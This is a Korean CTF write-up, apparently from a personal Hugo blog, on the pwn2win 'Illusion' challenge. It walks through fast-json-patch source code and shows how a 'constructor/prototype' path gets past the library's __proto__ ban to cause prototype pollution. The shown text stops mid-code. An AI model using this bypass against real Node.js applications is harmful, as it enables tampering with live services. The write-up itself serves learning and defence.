<!DOCTYPE html>
<html lang="en">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  
    <title>pwn2win CTF Illusion Write Up :: My New Hugo Site</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="This article is about write-up for the pwn2win CTF. there is only one web challenge, which contain Prototype Pollution bug" />
<meta name="keywords" content="" />

  <meta name="robots" content="noodp" />

<link rel="canonical" href="http://localhost:1313/posts/2021-05-31-pwn2win/" />







  
  
  
  
  
  <link rel="stylesheet" href="http://localhost:1313/styles.css">







  <link rel="shortcut icon" href="http://localhost:1313/img/theme-colors/orange.png">
  <link rel="apple-touch-icon" href="http://localhost:1313/img/theme-colors/orange.png">



<meta name="twitter:card" content="summary" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="pwn2win CTF Illusion Write Up">
<meta property="og:description" content="This article is about write-up for the pwn2win CTF. there is only one web challenge, which contain Prototype Pollution bug" />
<meta property="og:url" content="http://localhost:1313/posts/2021-05-31-pwn2win/" />
<meta property="og:site_name" content="My New Hugo Site" />

  
    <meta property="og:image" content="img/favicon/%!s(&lt;nil&gt;).png">
  

<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">


  <meta property="article:published_time" content="2021-05-31 23:29:53 &#43;0000 UTC" />













  


</head>
<body class="">




<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="http://localhost:1313/">
  <div class="logo">
    re-Terminal
  </div>
</a>

    </div>
    
    
  </div>
  
</header>


  <div class="content">
    
<article class="post">
  <h1 class="post-title">
    <a href="http://localhost:1313/posts/2021-05-31-pwn2win/">pwn2win CTF Illusion Write Up</a>
  </h1>
  <div class="post-meta"><time class="post-date">2021-05-31</time>
    
</div>

  
  



  

  <div class="post-content"><div>
        <h1 id="analysis--introduce">Analysis : Introduce<a href="#analysis--introduce" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p><img src="https://github.com/wjddnjs33/image/blob/main/prototype/prototype1.png?raw=true" alt=""></p>
<p>위 사진을 보면 <code>fast-json-patch</code> 모듈의 <code>applyPatch()</code> 메서드를 이용해서 a라는 메서드를 패치 시켜주는데, 이때 내부 오퍼레이션에 의해서 <code>Prototype Pollution</code> 취약점이 발생한다. 인자로는 2개의 값을 보내주는 것을 볼 수 있다. 첫 번째 인자는 패치할 주체가 들어가고, 두 번째 인자로는 패치의 적용할 데이터를 <code>Json</code> 형식으로 보내는 것을 볼 수 있고, 이 두 번째 인자에서 두 번째 값인 <code>path</code> 키의 대해서 <code>Prototype Pollution</code> 취약점이 발생한다.</p>
<hr>
<h1 id="analysis--applypatch">Analysis : applyPatch()<a href="#analysis--applypatch" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">applyPatch</span>(document, <span style="color:#a6e22e">patch</span>, <span style="color:#a6e22e">validateOperation</span>, <span style="color:#a6e22e">mutateDocument</span>, <span style="color:#a6e22e">banPrototypeModifications</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">mutateDocument</span> <span style="color:#f92672">===</span> <span style="color:#66d9ef">void</span> <span style="color:#ae81ff">0</span>) { <span style="color:#a6e22e">mutateDocument</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>; }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">banPrototypeModifications</span> <span style="color:#f92672">===</span> <span style="color:#66d9ef">void</span> <span style="color:#ae81ff">0</span>) { <span style="color:#a6e22e">banPrototypeModifications</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>; }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">validateOperation</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>Array.<span style="color:#a6e22e">isArray</span>(<span style="color:#a6e22e">patch</span>)) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">exports</span>.<span style="color:#a6e22e">JsonPatchError</span>(<span style="color:#e6db74">&#39;Patch sequence must be an array&#39;</span>, <span style="color:#e6db74">&#39;SEQUENCE_NOT_AN_ARRAY&#39;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">mutateDocument</span>) {
</span></span><span style="display:flex;"><span>        document <span style="color:#f92672">=</span> <span style="color:#a6e22e">helpers_js_1</span>.<span style="color:#a6e22e">_deepClone</span>(document);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">results</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Array(<span style="color:#a6e22e">patch</span>.<span style="color:#a6e22e">length</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">length_1</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">patch</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">length_1</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// we don&#39;t need to pass mutateDocument argument because if it was true, we already deep cloned the object, we&#39;ll just pass `true`
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">results</span>[<span style="color:#a6e22e">i</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">applyOperation</span>(document, <span style="color:#a6e22e">patch</span>[<span style="color:#a6e22e">i</span>], <span style="color:#a6e22e">validateOperation</span>, <span style="color:#66d9ef">true</span>, <span style="color:#a6e22e">banPrototypeModifications</span>, <span style="color:#a6e22e">i</span>);
</span></span><span style="display:flex;"><span>        document <span style="color:#f92672">=</span> <span style="color:#a6e22e">results</span>[<span style="color:#a6e22e">i</span>].<span style="color:#a6e22e">newDocument</span>; <span style="color:#75715e">// in case root was replaced
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">results</span>.<span style="color:#a6e22e">newDocument</span> <span style="color:#f92672">=</span> document;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">results</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>applyPatch()</code> 메서드는 <code>core.js</code> 파일에 정의가 되어 있다. 코드를 보면 중간 부분에 <code>patch</code> 배열을 <code>for</code> 문으로 돌려가며 하나씩 <code>applyOperation()</code> 메서드의 두 번째 인자로 넘겨주는 것을 볼 수 있고, 첫 번째 인자는 당연 우리가 보내준 패치 될 주체이다. 여 기서 <code>patch</code>는 우리가 위에서 <code>applyPatch()</code> 함수에 넘겨준 두 번째 인자값이 된다.</p>
<p><code>applyOperation()</code> 메서드를 호출하는 것을 보면 우리가 보낸 패치 파일을 다중으로 적용하는 것이 아닌 단일로 하나씩 적용하는 것으로 보인다.</p>
<hr>
<h1 id="analsys--applyoperation">Analsys : applyOperation()<a href="#analsys--applyoperation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">applyOperation</span>(document, <span style="color:#a6e22e">operation</span>, <span style="color:#a6e22e">validateOperation</span>, <span style="color:#a6e22e">mutateDocument</span>, <span style="color:#a6e22e">banPrototypeModifications</span>, <span style="color:#a6e22e">index</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">validateOperation</span> <span style="color:#f92672">===</span> <span style="color:#66d9ef">void</span> <span style="color:#ae81ff">0</span>) { <span style="color:#a6e22e">validateOperation</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>; }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">mutateDocument</span> <span style="color:#f92672">===</span> <span style="color:#66d9ef">void</span> <span style="color:#ae81ff">0</span>) { <span style="color:#a6e22e">mutateDocument</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>; }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">banPrototypeModifications</span> <span style="color:#f92672">===</span> <span style="color:#66d9ef">void</span> <span style="color:#ae81ff">0</span>) { <span style="color:#a6e22e">banPrototypeModifications</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>; }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">index</span> <span style="color:#f92672">===</span> <span style="color:#66d9ef">void</span> <span style="color:#ae81ff">0</span>) { <span style="color:#a6e22e">index</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">validateOperation</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">validateOperation</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;function&#39;</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">validateOperation</span>(<span style="color:#a6e22e">operation</span>, <span style="color:#ae81ff">0</span>, document, <span style="color:#a6e22e">operation</span>.<span style="color:#a6e22e">path</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">validator</span>(<span style="color:#a6e22e">operation</span>, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* ROOT OPERATIONS */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">operation</span>.<span style="color:#a6e22e">path</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;&#34;</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">returnValue</span> <span style="color:#f92672">=</span> { <span style="color:#a6e22e">newDocument</span><span style="color:#f92672">:</span> document };
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">operation</span>.<span style="color:#a6e22e">op</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;add&#39;</span>) {
</span></span><span style="display:flex;"><span>        ...
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">mutateDocument</span>) {
</span></span><span style="display:flex;"><span>            document <span style="color:#f92672">=</span> <span style="color:#a6e22e">helpers_js_1</span>.<span style="color:#a6e22e">_deepClone</span>(document);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">path</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">operation</span>.<span style="color:#a6e22e">path</span> <span style="color:#f92672">||</span> <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">keys</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39;/&#39;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">obj</span> <span style="color:#f92672">=</span> document;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">t</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>; <span style="color:#75715e">//skip empty element - http://jsperf.com/to-shift-or-not-to-shift
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">len</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">keys</span>.<span style="color:#a6e22e">length</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">existingPathFragment</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">undefined</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">key</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">void</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">validateFunction</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">void</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">validateOperation</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;function&#39;</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">validateFunction</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">validateOperation</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">validateFunction</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">validator</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> (<span style="color:#66d9ef">true</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">key</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">keys</span>[<span style="color:#a6e22e">t</span>];
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">banPrototypeModifications</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">key</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__proto__&#39;</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">TypeError</span>(<span style="color:#e6db74">&#39;JSON-Patch: modifying `__proto__` prop is banned for security reasons, if this was on purpose, please set `banPrototypeModifications` flag false and pass it to this function. More info in fast-json-patch README&#39;</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">validateOperation</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">existingPathFragment</span> <span style="color:#f92672">===</span> <span style="color:#66d9ef">undefined</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">obj</span>[<span style="color:#a6e22e">key</span>] <span style="color:#f92672">===</span> <span style="color:#66d9ef">undefined</span>) {
</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">existingPathFragment</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">keys</span>.<span style="color:#a6e22e">slice</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">t</span>).<span style="color:#a6e22e">join</span>(<span style="color:#e6db74">&#39;/&#39;</span>);
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">t</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">len</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">existingPathFragment</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">operation</span>.<span style="color:#a6e22e">path</span>;
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">existingPathFragment</span> <span style="color:#f92672">!==</span> <span style="color:#66d9ef">undefined</span>) {
</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">validateFunction</span>(<span style="color:#a6e22e">operation</span>, <span style="color:#ae81ff">0</span>, document, <span style="color:#a6e22e">existingPathFragment</span>);
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">t</span><span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (Array.<span style="color:#a6e22e">isArray</span>(<span style="color:#a6e22e">obj</span>)) {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">key</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;-&#39;</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">key</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">obj</span>.<span style="color:#a6e22e">length</span>;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">validateOperation</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">helpers_js_1</span>.<span style="color:#a6e22e">isInteger</span>(<span style="color:#a6e22e">key</span>)) {
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">exports</span>.<span style="color:#a6e22e">JsonPatchError</span>(<span style="color:#e6db74">&#34;Expected an unsigned base-10 integer value, making the new referenced value the array element with the zero-based index&#34;</span>, <span style="color:#e6db74">&#34;OPERATION_PATH_ILLEGAL_ARRAY_INDEX&#34;</span>, <span style="color:#a6e22e">index</span>, <span style="color:#a6e22e">operation</span>, document);
</span></span><span style="display:flex;"><span>                    } <span style="color:#75715e">// only parse key when it&#39;s an integer for `arr.prop` to work
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">helpers_js_1</span>.<span style="color:#a6e22e">isInteger</span>(<span style="color:#a6e22e">key</span>)) {
</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">key</span> <span style="color:#f92672">=</span> <span style="color:#f92672">~~</span><span style="color:#a6e22e">key</span>;
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">t</span> <span style="color:#f92672">&gt;=</span> <span style="color:#a6e22e">len</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">validateOperation</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">operation</span>.<span style="color:#a6e22e">op</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;add&#34;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">key</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">obj</span>.<span style="color:#a6e22e">length</span>) {
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">exports</span>.<span style="color:#a6e22e">JsonPatchError</span>(<span style="color:#e6db74">&#34;The specified index MUST NOT be greater than the number of elements in the array&#34;</span>, <span style="color:#e6db74">&#34;OPERATION_VALUE_OUT_OF_BOUNDS&#34;</span>, <span style="color:#a6e22e">index</span>, <span style="color:#a6e22e">operation</span>, document);
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">returnValue</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">arrOps</span>[<span style="color:#a6e22e">operation</span>.<span style="color:#a6e22e">op</span>].<span style="color:#a6e22e">call</span>(<span style="color:#a6e22e">operation</span>, <span style="color:#a6e22e">obj</span>, <span style="color:#a6e22e">key</span>, document); <span style="color:#75715e">// Apply patch
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">returnValue</span>.<span style="color:#a6e22e">test</span> <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span>) {
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">exports</span>.<span style="color:#a6e22e">JsonPatchError</span>(<span style="color:#e6db74">&#34;Test operation failed&#34;</span>, <span style="color:#e6db74">&#39;TEST_OPERATION_FAILED&#39;</span>, <span style="color:#a6e22e">index</span>, <span style="color:#a6e22e">operation</span>, document);
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">returnValue</span>;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">key</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">key</span>.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#39;~&#39;</span>) <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">key</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">helpers_js_1</span>.<span style="color:#a6e22e">unescapePathComponent</span>(<span style="color:#a6e22e">key</span>);
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">t</span> <span style="color:#f92672">&gt;=</span> <span style="color:#a6e22e">len</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">returnValue</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">objOps</span>[<span style="color:#a6e22e">operation</span>.<span style="color:#a6e22e">op</span>].<span style="color:#a6e22e">call</span>(<span style="color:#a6e22e">operation</span>, <span style="color:#a6e22e">obj</span>, <span style="color:#a6e22e">key</span>, document); <span style="color:#75715e">// Apply patch
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">returnValue</span>.<span style="color:#a6e22e">test</span> <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span>) {
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">exports</span>.<span style="color:#a6e22e">JsonPatchError</span>(<span style="color:#e6db74">&#34;Test operation failed&#34;</span>, <span style="color:#e6db74">&#39;TEST_OPERATION_FAILED&#39;</span>, <span style="color:#a6e22e">index</span>, <span style="color:#a6e22e">operation</span>, document);
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">returnValue</span>;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">obj</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">obj</span>[<span style="color:#a6e22e">key</span>];
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>applyOperation()</code> 메서드를 보면 중간에 슬래쉬를 이용해서 <code>path</code> 값을 스플릿하는 것을 볼 수 있다. 우리는 path의 값으로 <code>&quot;/constructor/prototype/polluted&quot;</code>와 같이 주었기 때문에 keys의 값은 <code>['constructor', 'prototype', 'polluted']</code>가 된다.</p>
<p>이렇게 값을 스플릿 해준 후에 keys.length만큼 와일문을 돌린다. 이때 <code>keys</code> 값으로 <code>__proto__</code>가 들어오면 <code>JSON-Patch: modifying '__proto__' prop is banned for security reasons, if this was on purpose, please set 'banPrototypeModifications' flag false and pass it to this function. More info in fast-json-patch READM</code>와 같은 구문을 출력하고 끝내는 것을 볼 수 있다. 아마도 <code>Prototype Pollution</code>을 방지한 것 같다.</p>
<p><img src="https://github.com/wjddnjs33/image/blob/main/prototype/%5B1.png?raw=true" alt=""></p>
<p>하지만 <code>__proto__</code> 프로퍼티와 <code>constructor.prototype</code> 프로퍼티는 동일하기 때문에 이를 이용해서 <code>Prototype Pollution</code> 공격을 할 수 있다.</p>
<p>와일문을 돌면서 if 문을 이용해서 조건에 맞는 오퍼레이션을 하는 것으로 보인다.</p>
<ul>
<li>첫 번째 조건은 일단 key의 값으로 <code>__proto__</code>가 존재하지 않아야 한다.</li>
<li>두 번째 조건은 <code>validateOperation</code>의 값이 참이어야 한다.</li>
<li>세 번째 조건은 우리가 전달해준 패치가 될 주체가 <code>Array</code>여야 한다.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">key</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">key</span>.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#39;~&#39;</span>) <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">key</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">helpers_js_1</span>.<span style="color:#a6e22e">unescapePathComponent</span>(<span style="color:#a6e22e">key</span>);
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">t</span> <span style="color:#f92672">&gt;=</span> <span style="color:#a6e22e">len</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">returnValue</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">objOps</span>[<span style="color:#a6e22e">operation</span>.<span style="color:#a6e22e">op</span>].<span style="color:#a6e22e">call</span>(<span style="color:#a6e22e">operation</span>, <span style="color:#a6e22e">obj</span>, <span style="color:#a6e22e">key</span>, document); <span style="color:#75715e">// Apply patch
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">returnValue</span>.<span style="color:#a6e22e">test</span> <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span>) {
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">exports</span>.<span style="color:#a6e22e">JsonPatchError</span>(<span style="color:#e6db74">&#34;Test operation failed&#34;</span>, <span style="color:#e6db74">&#39;TEST_OPERATION_FAILED&#39;</span>, <span style="color:#a6e22e">index</span>, <span style="color:#a6e22e">operation</span>, document);
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">returnValue</span>;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span></code></pre></div><p>위 세 가지지 조건을 모두 위배할 경우에는 위 코드가 실행이 된다. 일단 우리는 <code>patch</code>의 값으로 <code>~</code>가 들어간 곳이 없기 때문에 3번 모두 else문이 실행이 될 것 이다. else 문을 보면 <code>objOps</code>를 이용해서 패치를 하는 것을 볼 수 있고, 인자로는 연산자, 패치 될 주체, 패치할 값, 패치 될 주체를 넘겨주고 있는 것을 볼 수 있다. 여기서 우리는 연산자를 넘겨줄 때, <code>replace</code>를 넘겨주었다.</p>
<hr>
<h1 id="analysis--objops">Analysis : objOps<a href="#analysis--objops" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">objOps</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">add</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">obj</span>, <span style="color:#a6e22e">key</span>, document) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">obj</span>[<span style="color:#a6e22e">key</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">value</span>;
